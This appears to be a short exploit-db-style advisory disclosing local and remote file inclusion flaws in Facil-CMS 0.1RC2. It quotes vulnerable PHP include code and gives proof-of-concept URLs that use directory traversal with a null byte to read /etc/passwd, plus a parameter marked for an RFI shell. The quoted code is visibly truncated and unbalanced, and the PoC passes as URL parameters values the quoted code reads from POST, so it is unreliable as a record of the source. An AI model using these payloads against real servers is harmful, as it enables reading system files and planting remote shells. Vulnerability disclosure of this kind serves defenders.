Facil-CMS (LFI/RFI) Vulnerability
=================================

########################################################
    Facil-CMS (LFI/RFI) Vulnerability
########################################################
[+]Title    :   Facil-CMS Multiple Vulnerability
[+]Version: 0.1RC2
[+]Download:    http://sourceforge.net/projects/facil-cms/files/
[+]Author:  eidelweiss  
 
    [!]Thank`s To: all friends
 
########################################################
 
    -=[ Vuln C0de ]=-
***********************
[-]facil-cms/index.php
 
 require_once(&#039;config.inc.php&#039;);
 require_once(_FACIL_INCLUDES_PATH_ . &#039;/facil-settings.php&#039;);
  
 $config = new facilConfig();
 $utils = new facilUtils();
  
 if($utils->is_module($config->getSiteIndex()))
 
require_once(_FACIL_MODULES_PATH_ . &#039;/&#039; . $config->getSiteIndex() . &#039;/config.php&#039;);
require_once(_FACIL_MODULES_PATH_ . &#039;/&#039; . $config->getSiteIndex() . &#039;/class/index.php&#039;);
 
***********************
[-]facil-cms/modules.php
 
require_once(&#039;config.inc.php&#039;);
 require_once(_FACIL_INCLUDES_PATH_ . &#039;/facil-settings.php&#039;);
 
 if($_POST[&#039;modload&#039;] && !eregi("/", $_POST[&#039;modload&#039;]))
 {
    $_MODLOAD = trim($_POST[&#039;modload&#039;]);
    if($_POST[&#039;fileload&#039;] && !eregi("/", $_POST[&#039;fileload&#039;]))
    {
        $FILELOAD = trim($_POST[&#039;fileload&#039;]);
 
    $_MODLOAD = false;
    $FILELOAD = false;
 
 if($_POST[&#039;admload&#039;] &&  !eregi("/", $_POST[&#039;admload&#039;]))
 {
    $_ADMLOAD = trim($_POST[&#039;admload&#039;]);
    if($_POST[&#039;fileload&#039;] && !eregi("/", $_POST[&#039;fileload&#039;]))
 
 
    $_ADMLOAD = false;
    $FILELOAD = false;
 
    require_once(_FACIL_MODULES_PATH_ . &#039;/&#039; . $_MODLOAD . &#039;/config.php&#039;);
    require_once(_FACIL_MODULES_PATH_ . &#039;/&#039; . $_MODLOAD . &#039;/class/index.php&#039;);
 
*******************
 
[-]facil-cms/includes/facil-settings.php
 
if(!isset($_SESSION[&#039;FACIL_LANGUAGE&#039;]))
 {
    $_SESSION[&#039;FACIL_LANGUAGE&#039;] = $config->getLanguage();
 }
  
 require_once(_FACIL_I18N_PATH_ . &#039;/lang-&#039; . $_SESSION[&#039;FACIL_LANGUAGE&#039;] . &#039;.php&#039;);
 require_once(_FACIL_THEMES_PATH_ . &#039;/&#039; . $_SESSION[&#039;FACIL_THEME&#039;] . &#039;/themeFacil.class.php&#039;);
 
*******************
 
    -=[ Proof Of Concept ]=-
 
    http://127.0.0.1/facil-cms/modules.php?modload=../../../../../../../../etc/passwd%00
    Similar reference:
    http://www.exploit-db.com/exploits/5792
 
    http://127.0.0.1/facil-cms/index.php?getSiteIndex=../../../../../../../../etc/passwd%00
 
    http://127.0.0.1/facil-cms//includes/facil-settings.php?FACIL_THEME= [rfi shell]
 
########################################################



